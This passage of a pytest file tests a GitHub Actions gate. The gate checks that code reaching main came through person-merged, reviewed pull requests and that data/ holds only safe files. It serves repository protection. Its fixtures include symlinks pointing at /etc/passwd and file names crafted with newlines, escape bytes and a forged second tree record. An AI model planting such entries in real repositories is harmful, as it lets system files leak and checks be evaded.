    """note-failed/silent-noncompletion: a cancelled note job (by hand, or by GitHub) is not a silent day."""
    expr = WF["jobs"]["note-failed"]["if"]
    py = (expr.replace("always() && ", "").replace("needs.note.result", repr(result))
          .replace("||", "or").replace("&&", "and"))
    assert eval(py) == fires                                                     # noqa: S307  our own expression


def _git(cwd, *args):
    return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "init.defaultBranch=main",
                           *args], cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()


def _stale_check(tmp_path, change: str) -> int:
    """Run the note job's main-match step in a checkout of commit A while origin/main is A plus `change`."""
    step = _note_steps()["Check this commit's sender and config are main's"]
    origin, src, work = tmp_path / "origin.git", tmp_path / "src", tmp_path / "work"
    _git(tmp_path, "init", "-q", "--bare", str(origin))
    _git(tmp_path, "init", "-q", str(src))
    for rel in ("config/site.yml", "sender/deliver.py", "data/x.json", ".github/workflows/daily-update.yml"):
        (src / rel).parent.mkdir(parents=True, exist_ok=True)
        (src / rel).write_text("a\n")
    _git(src, "add", "-A")
    _git(src, "commit", "-q", "-m", "A")
    sha_a = _git(src, "rev-parse", "HEAD")
    if change:
        (src / change).parent.mkdir(parents=True, exist_ok=True)
        (src / change).write_text("b\n")
        _git(src, "add", "-A")
        _git(src, "commit", "-q", "-m", "B")
    _git(src, "push", "-q", f"file://{origin}", "HEAD:refs/heads/main")
    _git(tmp_path, "clone", "-q", "--depth=1", "--no-single-branch", f"file://{origin}", str(work))
    _git(work, "fetch", "-q", "--depth=1", "origin", sha_a)
    _git(work, "checkout", "-q", "--detach", sha_a)
    r = subprocess.run(["bash", "-c", step["run"]], cwd=work, capture_output=True, text=True)
    return r.returncode


@pytest.mark.parametrize("change,ok", [("", True), ("data/x.json", True), ("data/new.json", True),
                                       ("sender/deliver.py", False), ("config/site.yml", False),
                                       (".github/workflows/daily-update.yml", False),
                                       (".github/workflows/other.yml", False),
                                       # main-protect/stale-check-availability: the job loads nothing else from the
                                       # checkout, so a later docs or root-file PR does not cancel the day's note
                                       ("json.py", True), ("sitegen/build.py", True), ("docs/x.md", True)])
def test_note_refuses_an_older_commit_than_main(tmp_path, change, ok):
    """note-job/stale-rerun: re-running an older run checks out that day's github.sha (and runs that day's workflow
    file) while the plan is built from today's main; the note job must stop unless sender/, config/site.yml and the
    workflows are main's (note-job/stale-rerun-workflow-gap). Data commits and other files are fine (the PR check,
    not this one, covers everything outside data/)."""
    names = [s.get("name") for s in WF["jobs"]["note"]["steps"]]
    assert names.index("Check out this run's commit") + 1 == names.index(
        "Check this commit's sender and config are main's")
    assert (_stale_check(tmp_path, change) == 0) == ok


# ------------------------------------------------------------------ main-protect: the gate job (T4.10.2, ADR 0009)
GATE_STEP = "Check every change outside data/ reached main by a reviewed pull request a person merged"
PR_STEP = GATE_STEP          # the one copy of the history check (it moved out of the note job)
STALE_STEP = "Check this commit's sender and config are main's"
PR_JQ = ('[.[] | select(.merged_at != null and .base.ref == "main" and .merge_commit_sha == $ENV.COMMIT) | .number '
         '| tostring] | join(" ")')
# the PR found: who merged it, its head and merge time (only the single-PR endpoint has merged_by)
PULL_JQ = '[(.merged_by.type // "none"), (.head.sha // "none"), (.merged_at // "none")] | join(" ")'
REVIEW_JQ = ('.[] | select(.user.type == "User" and (.author_association == "OWNER" or .author_association == '
             '"COLLABORATOR") and .commit_id == $ENV.HEAD_SHA and (.state == "COMMENTED" or '
             '.state == "APPROVED") and .submitted_at != null and .submitted_at <= $ENV.MERGED_AT) | .id | tostring')
MERGED_AT = "2026-11-11T00:00:00Z"
# note-job/pr-check-test-gap: the stub evaluates the step's own --jq filters with jq (gh uses gojq), so the cases
# test the filters the workflow runs, not a Python copy of them.
_PULLS_STUB = '''#!/usr/bin/env python3
import json, os, subprocess, sys
a = sys.argv[1:]
with open(os.environ["GH_CALLS"], "a") as f:
    f.write(" ".join(a) + "\\n")
if os.environ.get("GH_FAIL"):
    sys.exit(1)
pulls = json.load(open(os.environ["PULLS"]))
assert a[0] == "api" and os.environ["GH_TOKEN"] == "t", a
def by_number(num):
    return next((p for v in pulls.values() for p in v if p["number"] == num), None)
if a[1] == "--paginate":
    assert len(a) == 5 and a[3] == "--jq" and a[4] == os.environ["REVIEW_JQ"], a
    path = a[2].removeprefix("repos/o/r/pulls/").removesuffix("/reviews?per_page=100")
    pr = by_number(int(path))
    reviews = pr["reviews"] if pr else []
    for i in range(0, max(len(reviews), 1), 2):              # pages of 2: the step must add the pages up
        r = subprocess.run(["jq", "-r", a[4]], input=json.dumps(reviews[i:i + 2]), capture_output=True, text=True)
        sys.stdout.write(r.stdout)
    sys.exit(0)
assert len(a) == 4 and a[2] == "--jq", a
if a[1].startswith("repos/o/r/pulls/"):
    assert a[3] == os.environ["PULL_JQ"], a
    data = by_number(int(a[1].removeprefix("repos/o/r/pulls/"))) or {"message": "Not Found"}
    data = {k: v for k, v in data.items() if k != "reviews"}
else:
    assert a[3] == os.environ["EXPECTED_JQ"], a
    sha = a[1].removeprefix("repos/o/r/commits/").removesuffix("/pulls")
    assert os.environ["COMMIT"] == sha
    data = [{k: v for k, v in p.items() if k not in ("merged_by", "reviews")} for p in pulls.get(sha, [])]
r = subprocess.run(["jq", "-r", a[3]], input=json.dumps(data), capture_output=True, text=True)
sys.stdout.write(r.stdout)
sys.stderr.write(r.stderr)
sys.exit(r.returncode)
'''
_ALL = ("config/site.yml", "sender/deliver.py", "data/x.json", ".github/workflows/daily-update.yml")


def _need_jq():
    """jq runs the gate's filters in these tests: skip where it is missing locally, fail in CI (CI is set on
    GitHub's runners, which ship jq), so the check is never skipped quietly where it matters."""
    if not shutil.which("jq"):
        if os.environ.get("CI"):
            pytest.fail("jq is not installed on this CI runner: the gate tests need it")
        pytest.skip("jq not installed")


_PR_NUMBERS = itertools.count(1)
HEAD = "HEAD"          # in a review's commit_id or a PR's head: the PR's own head sha


_REVIEW_IDS = itertools.count(500)


def _review(commit=HEAD, state="COMMENTED", user="User", at="2026-11-10T23:00:00Z", assoc="OWNER"):
    """A review as GitHub returns it; `assoc` is author_association (OWNER, COLLABORATOR, CONTRIBUTOR, NONE...)."""
    return {"id": next(_REVIEW_IDS), "user": {"type": user}, "commit_id": commit, "state": state, "submitted_at": at,
            "author_association": assoc}


def _pr(sha, merged=True, base="main", by="User", head=None, reviews=None):
    """A pull request as GitHub returns it; `by` is merged_by.type (User, Bot, or None for no merged_by); `head` the
    head sha label (default: the merged-in branch of a merge op, else a sha of its own); `reviews` default one
    person's COMMENTED review at the head before the merge."""
    return {"number": next(_PR_NUMBERS), "merged_at": MERGED_AT if merged else None, "base": {"ref": base},
            "merge_commit_sha": sha, "merged_by": {"type": by} if by else None, "head": {"sha": head},
            "reviews": [_review()] if reviews is None else reviews}


def _commit_calls(calls):
    return [c for c in calls if "/commits/" in c]


def _gate_steps():
    return {s.get("name"): s for s in WF["jobs"]["gate"]["steps"]}


def _pr_check(tmp_path, ops, pulls, gh_fail=False, baseline="BASE", ref="refs/heads/main"):
    """Build main from `ops`, check out its tip from a depth-1 clone (as actions/checkout does) and run the gate's
    check step. main starts with a commit BASE touching every checked path, with no PR (the history before go-live).
    ops: ("commit", label, paths) on main, or ("merge", label, branch_label, paths): a branch commit touching paths,
    merged into main with --no-ff. pulls: {label: [pr(sha_label or a literal sha), ...]}. baseline: the label (or a
    literal value) given as MAIN_PR_BASELINE. Returns (exit, gh calls, {label: sha}, step outputs)."""
    _need_jq()
    step = _gate_steps()[GATE_STEP]
    origin, src, work, bindir = tmp_path / "origin.git", tmp_path / "src", tmp_path / "work", tmp_path / "bin"
    _git(tmp_path, "init", "-q", "--bare", str(origin))
    _git(origin, "config", "uploadpack.allowFilter", "true")   # as GitHub: --filter=blob:none is honoured, not ignored
    _git(tmp_path, "init", "-q", str(src))
    shas, n, merged_in = {}, 0, {}

    def touch(paths):
        nonlocal n
        for rel in paths:
            n += 1
            (src / rel).parent.mkdir(parents=True, exist_ok=True)
            (src / rel).write_text(f"{n}\n")
        _git(src, "add", "-A")

    for op in [("commit", "BASE", _ALL), *ops]:
        if op[0] == "commit":
            touch(op[2])
            _git(src, "commit", "-q", "-m", op[1])
            shas[op[1]] = _git(src, "rev-parse", "HEAD")
        else:
            _, label, branch_label, paths = op
            _git(src, "checkout", "-q", "-b", branch_label)
            touch(paths)
            _git(src, "commit", "-q", "-m", branch_label)
            shas[branch_label] = _git(src, "rev-parse", "HEAD")
            _git(src, "checkout", "-q", "main")
            _git(src, "merge", "-q", "--no-ff", "-m", label, branch_label)
            shas[label] = _git(src, "rev-parse", "HEAD")
            merged_in[label] = branch_label
    _git(src, "push", "-q", f"file://{origin}", "main:refs/heads/main")
    _git(tmp_path, "clone", "-q", "--depth=1", f"file://{origin}", str(work))
    tip = shas[ops[-1][1]]
    _git(work, "checkout", "-q", "--detach", tip)
    assert _git(work, "rev-parse", "--is-shallow-repository") == "true"

    def resolve(label, p):
        head = p["head"]["sha"]
        head = shas.get(head, head) if head else (shas[merged_in[label]] if label in merged_in else "e" * 40)
        reviews = [{**r, "commit_id": head if r["commit_id"] == HEAD else shas.get(r["commit_id"], r["commit_id"])}
                   for r in p["reviews"]]
        return {**p, "merge_commit_sha": shas.get(p["merge_commit_sha"], p["merge_commit_sha"]), "head": {"sha": head},
                "reviews": reviews}

    resolved = {shas[k]: [resolve(k, p) for p in v] for k, v in pulls.items()}
    (tmp_path / "pulls.json").write_text(json.dumps(resolved))
    bindir.mkdir()
    (bindir / "gh").write_text(_PULLS_STUB)
    (bindir / "gh").chmod(0o755)
    calls, out = tmp_path / "gh-calls", tmp_path / "github-output"
    out.write_text("")
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_TOKEN": "t", "GITHUB_REPOSITORY": "o/r",
           "GH_CALLS": str(calls), "PULLS": str(tmp_path / "pulls.json"), "EXPECTED_JQ": PR_JQ, "PULL_JQ": PULL_JQ,
           "REVIEW_JQ": REVIEW_JQ, "SHA": tip, "REF": ref, "GITHUB_OUTPUT": str(out), "RUNNER_TEMP": str(tmp_path),
           "MAIN_PR_BASELINE": shas.get(baseline, baseline), **({"GH_FAIL": "1"} if gh_fail else {})}
    r = subprocess.run(["bash", "-c", step["run"]], cwd=work, env=env, capture_output=True, text=True)
    assert "Traceback" not in r.stderr, r.stderr
    calls = calls.read_text().splitlines() if calls.exists() else []
    if calls:   # it read a PR, so it fetched main's whole history after the depth-1 clone, without file contents
        assert _git(work, "rev-parse", "--is-shallow-repository") == "false"
        assert _git(work, "config", "--get", "remote.origin.partialclonefilter") == "blob:none"
        assert "filtering not recognized by server" not in r.stderr, r.stderr
    outputs = dict(ln.split("=", 1) for ln in out.read_text().splitlines() if "=" in ln)
    if r.returncode == 0:
        assert outputs["sha"] == tip and outputs["verified"] in ("true", "false"), outputs
    else:
        assert outputs == {}, outputs            # a refusal outputs nothing: no job reads a verdict from it
    return r.returncode, calls, shas, outputs


DATA = ("data/x.json",)
SENDER = ("sender/deliver.py",)
OLD = "2026-11-10T22:00:00Z"
# case: (ops on main after BASE, pulls, passes?, the commits whose PRs are read, newest first)
PR_CASES = {
    # the PR-merged commit, then daily data/ commits pushed without a PR (before the data PR): passes
    "pr-then-data-days": ([("commit", "A", _ALL), ("commit", "D1", DATA), ("commit", "D2", DATA)],
                          {"A": [_pr("A")]}, True, ["A"]),
    # two PRs: every one is read
    "pr-then-pr": ([("commit", "A", _ALL), ("commit", "D", DATA), ("commit", "P", SENDER)],
                   {"A": [_pr("A")], "P": [_pr("P")]}, True, ["P", "A"]),
    # a merge-commit PR (the branch commit itself has no PR of its own), then a data day
    "merge-commit-pr": ([("commit", "A", _ALL), ("merge", "M", "B", SENDER), ("commit", "D", DATA)],
                        {"A": [_pr("A")], "M": [_pr("M")]}, True, ["M", "A"]),
    # pushed straight to main (ruleset off, or a bypass put back): refused
    "direct-sender": ([("commit", "A", _ALL), ("commit", "X", SENDER), ("commit", "D", DATA)],
                      {"A": [_pr("A")]}, False, ["X"]),
    "direct-config": ([("commit", "A", _ALL), ("commit", "X", ("config/site.yml",))], {"A": [_pr("A")]}, False,
                      ["X"]),
    "direct-other-workflow": ([("commit", "A", _ALL), ("commit", "X", (".github/workflows/other.yml",))],
                              {"A": [_pr("A")]}, False, ["X"]),
    # main-protect/pr-check-last-commit-only: A (PR) -> X (direct) -> P (PR) is still refused
    "pr-direct-pr": ([("commit", "A", _ALL), ("commit", "X", SENDER), ("commit", "P", ("config/site.yml",))],
                     {"A": [_pr("A")], "P": [_pr("P")]}, False, ["P", "X"]),
    "pr-direct-merge-pr": ([("commit", "A", _ALL), ("commit", "X", (".github/workflows/other.yml",)),
                            ("merge", "M", "B", SENDER), ("commit", "D", DATA)],
                           {"A": [_pr("A")], "M": [_pr("M")]}, False, ["M", "X"]),
    # the commit belongs to a PR that is still open, merged elsewhere, or merged as another commit: refused
    "open-pr": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                {"A": [_pr("A")], "X": [_pr("X", merged=False)]}, False, ["X"]),
    "pr-into-other-branch": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                             {"A": [_pr("A")], "X": [_pr("X", base="dev")]}, False, ["X"]),
    "pr-merged-as-another-commit": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                                    {"A": [_pr("A")], "X": [_pr("f" * 40)]}, False, ["X"]),
    # a merge pushed straight to main whose merged-in side is a PR's commit: main's own commit (first parent) counts
    "pushed-merge-of-pr-commit": ([("commit", "A", _ALL), ("merge", "M", "E", SENDER)],
                                  {"A": [_pr("A")], "E": [_pr("E")]}, False, ["M"]),
    # main-protect/pr-check-path-scope: anything outside data/ is checked, not only sender/, config and .github/
    "direct-root-py": ([("commit", "A", _ALL), ("commit", "X", ("json.py",)), ("commit", "D", DATA)],
                       {"A": [_pr("A")]}, False, ["X"]),
    "direct-sitegen": ([("commit", "A", _ALL), ("commit", "X", ("sitegen/build.py",))], {"A": [_pr("A")]}, False,
                       ["X"]),
    "pr-direct-root-pr": ([("commit", "A", _ALL), ("commit", "X", ("pyproject.toml",)), ("commit", "P", SENDER)],
                          {"A": [_pr("A")], "P": [_pr("P")]}, False, ["P", "X"]),
    "pr-root-py": ([("commit", "A", _ALL), ("commit", "P", ("json.py", "docs/x.md")), ("commit", "D", DATA)],
                   {"A": [_pr("A")], "P": [_pr("P")]}, True, ["P", "A"]),
    # no PR at all after the baseline (the team's earlier merges without PRs): refused
    "no-pr-history": ([("commit", "A", _ALL), ("commit", "D", DATA)], {}, False, ["A"]),
    # the push job's daily data/ PRs, merged by GitHub Actions (a bot): data/ only, so never read
    "pr-then-data-prs": ([("commit", "A", _ALL), ("commit", "D1", DATA), ("merge", "D2", "DB", DATA)],
                         {"A": [_pr("A")], "D1": [_pr("D1", by="Bot")], "D2": [_pr("D2", by="Bot")]}, True, ["A"]),
    # main-protect/bot-merged-code: a code PR merged by a bot (a workflow on any branch merging its own PR), or with
    # no merged_by, is refused; a later person's PR does not launder it
    "bot-merged-sender": ([("commit", "A", _ALL), ("commit", "X", SENDER), ("commit", "D", DATA)],
                          {"A": [_pr("A")], "X": [_pr("X", by="Bot")], "D": [_pr("D", by="Bot")]}, False, ["X"]),
    "bot-merged-then-pr": ([("commit", "A", _ALL), ("commit", "X", (".github/workflows/daily-update.yml",)),
                            ("commit", "P", SENDER)],
                           {"A": [_pr("A")], "X": [_pr("X", by="Bot")], "P": [_pr("P")]}, False, ["P", "X"]),
    "no-merged-by": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                     {"A": [_pr("A")], "X": [_pr("X", by=None)]}, False, ["X"]),
    "ff-push-by-bot": ([("commit", "A", _ALL), ("commit", "X", ("json.py",))],
                       {"A": [_pr("A")], "X": [_pr("X", by="Bot")]}, False, ["X"]),
    # T4.10.2: the review at the PR's head (I-main)
    "no-review": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                  {"A": [_pr("A")], "X": [_pr("X", reviews=[])]}, False, ["X"]),
    "review-at-older-commit": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                               {"A": [_pr("A")], "X": [_pr("X", reviews=[_review(commit="d" * 40)])]}, False, ["X"]),
    "review-by-bot": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                      {"A": [_pr("A")], "X": [_pr("X", reviews=[_review(user="Bot", state="APPROVED")])]}, False,
                      ["X"]),
    "review-after-merge": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                           {"A": [_pr("A")], "X": [_pr("X", reviews=[_review(at="2026-11-11T00:00:01Z")])]}, False,
                           ["X"]),
    "review-dismissed": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                         {"A": [_pr("A")], "X": [_pr("X", reviews=[_review(state="DISMISSED")])]}, False, ["X"]),
    "review-changes-requested": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                                 {"A": [_pr("A")], "X": [_pr("X", reviews=[_review(state="CHANGES_REQUESTED")])]},
                                 False, ["X"]),
    "two-prs-one-commit": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                           {"A": [_pr("A")], "X": [_pr("X"), _pr("X")]}, False, ["X"]),
    "merge-second-parent-not-head": ([("commit", "A", _ALL), ("merge", "M", "B", SENDER)],
                                     {"A": [_pr("A")], "M": [_pr("M", head="c" * 40)]}, False, ["M"]),
    "commented-review-at-head": ([("commit", "A", _ALL), ("commit", "P", SENDER)],
                                 {"A": [_pr("A")], "P": [_pr("P", reviews=[_review(state="DISMISSED", at=OLD),
                                                                           _review(commit="d" * 40), _review()])]},
                                 True, ["P", "A"]),
    "approved-review-at-head": ([("commit", "A", _ALL), ("commit", "P", SENDER)],
                                {"A": [_pr("A")], "P": [_pr("P", reviews=[_review(user="Bot"),
                                                                          _review(state="APPROVED", at=MERGED_AT)])]},
                                True, ["P", "A"]),
    # M-1 main-protect/review-by-any-account: the repo is public, so any account can post a COMMENT review at the
    # head; only the owner's or a collaborator's review counts
    "review-by-outsider": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                           {"A": [_pr("A")], "X": [_pr("X", reviews=[_review(assoc="NONE")])]}, False, ["X"]),
    "review-by-contributor": ([("commit", "A", _ALL), ("commit", "X", SENDER)],
                              {"A": [_pr("A")], "X": [_pr("X", reviews=[_review(assoc="CONTRIBUTOR"),
                                                                        _review(assoc="MEMBER")])]}, False, ["X"]),
    "review-by-collaborator": ([("commit", "A", _ALL), ("commit", "P", SENDER)],
                               {"A": [_pr("A")], "P": [_pr("P", reviews=[_review(assoc="NONE"),
                                                                         _review(assoc="COLLABORATOR")])]},
                               True, ["P", "A"]),
    "review-by-owner": ([("commit", "A", _ALL), ("commit", "P", SENDER)],
                        {"A": [_pr("A")], "P": [_pr("P", reviews=[_review(assoc="OWNER", state="APPROVED")])]},
                        True, ["P", "A"]),
}


@pytest.mark.parametrize("case", list(PR_CASES))
def test_the_gate_refuses_unless_every_code_change_is_a_reviewed_pr_a_person_merged(tmp_path, case):
    ops, pulls, ok, read = PR_CASES[case]
    code, calls, shas, out = _pr_check(tmp_path, ops, pulls)
    assert (code == 0) == ok, (case, code)
    assert code in (0, 2), code
    if ok:
        assert out["verified"] == "true"
    # main's own commits only, newest first, stopping at the first refusal
    assert _commit_calls(calls) == [f"api repos/o/r/commits/{shas[c]}/pulls --jq {PR_JQ}" for c in read]
    for c in calls:
        assert c.startswith(("api repos/o/r/commits/", "api repos/o/r/pulls/", "api --paginate repos/o/r/pulls/")), c


def test_the_gate_ignores_history_up_to_the_baseline(tmp_path):
    """The baseline (main when it was set, read by a person) and everything before it are not read: a direct push X
    before it does not refuse; the same history with the baseline before X does."""
    ops = [("commit", "X", SENDER), ("commit", "G", DATA), ("commit", "P", (".github/workflows/daily-update.yml",))]
    (tmp_path / "g").mkdir()
    code, calls, shas, out = _pr_check(tmp_path / "g", ops, {"P": [_pr("P")]}, baseline="G")
    assert code == 0 and out["verified"] == "true"
    assert _commit_calls(calls) == [f"api repos/o/r/commits/{shas['P']}/pulls --jq {PR_JQ}"]
    (tmp_path / "base").mkdir()
    code, calls, shas, _ = _pr_check(tmp_path / "base", ops, {"P": [_pr("P")]}, baseline="BASE")
    assert code == 2 and _commit_calls(calls) == [f"api repos/o/r/commits/{shas[c]}/pulls --jq {PR_JQ}"
                                                  for c in ("P", "X")]


@pytest.mark.parametrize("baseline", ["not-a-sha", "A" * 40, "a" * 40, "B", "P"])
def test_the_gate_fails_closed_with_an_invalid_baseline(tmp_path, baseline):
    """Not a sha, a sha that is not in the history, a commit of a merged-in branch (not on main's first-parent line),
    or a baseline with no checked change after it (the commit that set it always is one): refused, no PR read."""
    ops = [("commit", "A", _ALL), ("merge", "M", "B", SENDER), ("commit", "P", SENDER)]
    code, calls, _, out = _pr_check(tmp_path, ops, {"A": [_pr("A")], "M": [_pr("M")], "P": [_pr("P")]},
                                    baseline=baseline)
    assert code == 2 and calls == [] and out == {}


@pytest.mark.parametrize("baseline,ref", [("", "refs/heads/main"), ("BASE", "refs/heads/feature"),
                                          ("", "refs/heads/feature"), ("not-a-sha", "refs/tags/v1")])
def test_phase_0_and_other_refs_pass_unverified(tmp_path, baseline, ref):
    """An empty baseline (phase 0) on main, or any run not on main: verified=false with success, no PR read, so
    update, push and deploy run as before and the note job never runs."""
    ops = [("commit", "A", _ALL), ("commit", "X", SENDER)]                    # X would be refused if checked
    code, calls, shas, out = _pr_check(tmp_path, ops, {}, baseline=baseline, ref=ref)
    assert code == 0 and calls == [] and out == {"sha": shas["X"], "verified": "false"}


def test_the_gate_refuses_a_checkout_that_is_not_the_runs_commit(tmp_path):
    _need_jq()
    step = _gate_steps()[GATE_STEP]
    work = tmp_path / "w"
    _git(tmp_path, "init", "-q", str(work))
    (work / "f").write_text("1\n")
    _git(work, "add", "-A")
    _git(work, "commit", "-q", "-m", "c")
    out = tmp_path / "o"
    out.write_text("")
    for sha in ("f" * 40, "", "HEAD"):
        r = subprocess.run(["bash", "-c", step["run"]], cwd=work, capture_output=True, text=True,
                           env={**os.environ, "SHA": sha, "REF": "refs/heads/feature", "MAIN_PR_BASELINE": "",
                                "GITHUB_OUTPUT": str(out), "GH_TOKEN": "t"})
        assert r.returncode == 2 and out.read_text() == "", sha


# I-data (docs/architecture/main-protect-invariant.md "I-data", after M-2 and S-1): the gate's check of data/'s shape.
# Entries are (mode, path bytes), built straight into tree objects (git mktree), so modes are exact (120000 symlink,
# 160000 submodule, 100755 executable) and names may hold any byte, whatever the file system or index would allow.
def _shape_literal(run: str) -> bytes:
    """SHAPE as bash makes it from the step's own `SHAPE=$'...'` line (exactly one such line)."""
    lines = [ln.strip() for ln in run.splitlines() if ln.strip().startswith("SHAPE=$'")]
    assert len(lines) == 1, lines
    return subprocess.run(["bash", "-c", lines[0] + '\nprintf %s "$SHAPE"'], capture_output=True, check=True).stdout


GATE_SHAPE = None     # filled lazily: _gate_steps() needs WF, defined above


def _gate_shape() -> bytes:
    global GATE_SHAPE
    if GATE_SHAPE is None:
        GATE_SHAPE = _shape_literal(_gate_steps()[GATE_STEP]["run"])
    return GATE_SHAPE


MANIFEST = ("100644", b"data/manifest.json")
SHAPE_OK = {
    "json-yml-and-change-logs": [MANIFEST, ("100644", b"data/a/b.yml"), ("100644", b"data/changes.jsonl"),
                                 ("100644", b"data/a/b/changes.jsonl"), ("100644", b"data/localities/c-tn/m_1.json")],
    # outside data/: not the shape check's (a code change; the history check reads its PR)
    "outside-data-is-not-shape-checked": [MANIFEST, ("100755", b"database.sh"), ("120000", b"data.json")],
}
SHAPE_BAD = {
    "symlink": [MANIFEST, ("120000", b"data/x.json")],
    "symlinked-change-log": [MANIFEST, ("120000", b"data/changes.jsonl")],
    "submodule": [MANIFEST, ("160000", b"data/sub")],
    "submodule-named-json": [MANIFEST, ("160000", b"data/x.json")],
    "executable": [MANIFEST, ("100755", b"data/x.json")],
    "html": [MANIFEST, ("100644", b"data/x.html")],
    "other-jsonl": [MANIFEST, ("100644", b"data/x.jsonl")],
    "xchanges-jsonl": [MANIFEST, ("100644", b"data/xchanges.jsonl")],
    "script": [MANIFEST, ("100644", b"data/run.sh")],
    "json-then-suffix": [MANIFEST, ("100644", b"data/x.json.sh")],
    "gitattributes": [MANIFEST, ("100644", b"data/.gitattributes")],
    # S-1: names compared as bytes; under a UTF-8 locale grep would withhold these ("binary file matches")
    "non-utf8-byte": [MANIFEST, ("100644", b"data/\xff.json")],
    "non-utf8-symlink": [MANIFEST, ("120000", b"data/\xff.json")],
    "newline-in-name": [MANIFEST, ("100644", b"data/a\nb.json")],
    "escape-in-name": [MANIFEST, ("100644", b"data/x\x1b.json")],
    "hidden-name": [MANIFEST, ("100644", b"data/.x.json")],
    "dot-dot-part": [MANIFEST, ("100644", b"data/a/../b.json")],
    "space-in-name": [MANIFEST, ("100644", b"data/a b.json")],
    # a name with a newline that forges a good-looking second record: one NUL record, so it fails whole
    "newline-forged-name": [MANIFEST, ("120000", b"data/l\n100644 blob " + b"a" * 40 + b"\tdata/y.json")],
    # L-a: no data/ tree, data as a link or a file, or data/ emptied
    "no-data": [],
    "data-is-a-symlink": [("120000", b"data")],
    "data-is-a-file": [("100644", b"data")],
    "data-is-a-submodule": [("160000", b"data")],
    "data-emptied": [("040000", b"data")],
}
# the gate's step under a UTF-8 locale (where S-1 failed open), under C, and with LC_ALL unset (LANG UTF-8)
LOCALES = {"C.UTF-8": {"LC_ALL": "C.UTF-8"}, "C": {"LC_ALL": "C"}, "unset": {"LC_ALL": None, "LANG": "C.UTF-8"}}
# tests/suite-time: only names whose bytes a locale can treat differently (S-1) run in every locale; the rest in
# C.UTF-8, the locale where S-1 failed open
BYTE_SENSITIVE = ("non-utf8-byte", "non-utf8-symlink", "newline-in-name", "escape-in-name", "newline-forged-name")
BAD_LOCALE_CASES = [(c, loc) for c in SHAPE_BAD for loc in (LOCALES if c in BYTE_SENSITIVE else ["C.UTF-8"])]


def _mktree(repo, entries) -> str:
    """A tree holding `entries` [(mode, path bytes)]; mode 040000 is an empty folder; 160000 names a commit that need
    not exist; a symlink's blob is its target, any other blob a small JSON naming its path (so blobs differ)."""
    tree: dict = {}
    for mode, path in entries:
        *dirs, leaf = path.split(b"/")
        node = tree
        for d in dirs:
            node = node.setdefault(d, {})
        node[leaf] = mode

    def write(node) -> str:
        recs = []
        for name, v in node.items():
            if isinstance(v, dict):
                recs.append(b"040000 tree " + write(v).encode() + b"\t" + name)
            elif v == "040000":
                recs.append(b"040000 tree " + write({}).encode() + b"\t" + name)
            elif v == "160000":
                recs.append(b"160000 commit " + b"c" * 40 + b"\t" + name)
            else:
                content = b"/etc/passwd" if v == "120000" else b"{\"name\": \"" + name.hex().encode() + b"\"}\n"
                blob = subprocess.run(["git", "hash-object", "-w", "--stdin"], cwd=repo, input=content,
                                      capture_output=True, check=True).stdout.strip()
                recs.append(v.encode() + b" blob " + blob + b"\t" + name)
        return subprocess.run(["git", "mktree", "-z", "--missing"], cwd=repo, input=b"".join(r + b"\0" for r in recs),
                              capture_output=True, check=True).stdout.decode().strip()
    return write(tree)


def _shape_origin(tmp_path, entries):
    """A bare origin whose main has one commit: sender/x.py plus `entries`. Returns (origin, tip sha)."""
    origin, src = tmp_path / "origin.git", tmp_path / "src"
    _git(tmp_path, "init", "-q", "--bare", str(origin))
    _git(origin, "config", "uploadpack.allowFilter", "true")
    _git(tmp_path, "init", "-q", str(src))
    tree = _mktree(src, [("100644", b"sender/x.py"), *entries])
    tip = _git(src, "commit-tree", tree, "-m", "c")
    _git(src, "push", "-q", f"file://{origin}", f"{tip}:refs/heads/main")
    return origin, tip


def _run_gate(work, tmp_path, tip, baseline="", ref="refs/heads/main", env_over=None):
    """The gate step in `work`, with a gh that only records that it was called (the shape check never needs it).
    stdout is bytes, so a test can see every byte the step would put in the log."""
    bindir, calls, out = tmp_path / "bin", tmp_path / "gh-calls", tmp_path / "github-output"
    bindir.mkdir(exist_ok=True)
    (bindir / "gh").write_text(f"#!/bin/sh\necho \"$*\" >> '{calls}'\nexit 1\n")
    (bindir / "gh").chmod(0o755)
    out.write_text("")
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_TOKEN": "t", "GITHUB_REPOSITORY": "o/r",
           "SHA": tip, "REF": ref, "GITHUB_OUTPUT": str(out), "MAIN_PR_BASELINE": baseline,
           "RUNNER_TEMP": str(tmp_path)}
    for k, v in (env_over or {}).items():
        if v is None:
            env.pop(k, None)
        else:
            env[k] = v
    r = subprocess.run(["bash", "-c", _gate_steps()[GATE_STEP]["run"]], cwd=work, env=env, capture_output=True)
    outputs = dict(ln.split("=", 1) for ln in out.read_text().splitlines() if "=" in ln)
    return r, outputs, calls.exists()


def _shape_check(tmp_path, entries, **kw):
    origin, tip = _shape_origin(tmp_path, entries)
    work = tmp_path / "work"
    # depth 1, as actions/checkout; no working files (a name like a/../b.json cannot be checked out, and the check
    # reads only the commit's tree)
    _git(tmp_path, "clone", "-q", "--depth=1", "--no-checkout", f"file://{origin}", str(work))
    assert _git(work, "rev-parse", "HEAD") == tip
    return (tip, *_run_gate(work, tmp_path, tip, **kw))


def _error_lines_are_printable(stdout: bytes):
    for ln in stdout.split(b"\n"):
        if ln.startswith(b"::error::"):
            assert all(0x20 <= c <= 0x7E for c in ln), ln


@pytest.mark.parametrize("loc", ["C.UTF-8"])
@pytest.mark.parametrize("case", list(SHAPE_OK))
def test_the_gate_accepts_data_that_meets_i_data(tmp_path, case, loc):
    tip, r, out, called = _shape_check(tmp_path, SHAPE_OK[case], env_over=LOCALES[loc])
    assert r.returncode == 0, r.stdout + r.stderr
    assert out == {"sha": tip, "verified": "false"} and not called          # phase 0 on main: passes, unverified


@pytest.mark.parametrize("loc", ["C.UTF-8", "C"])
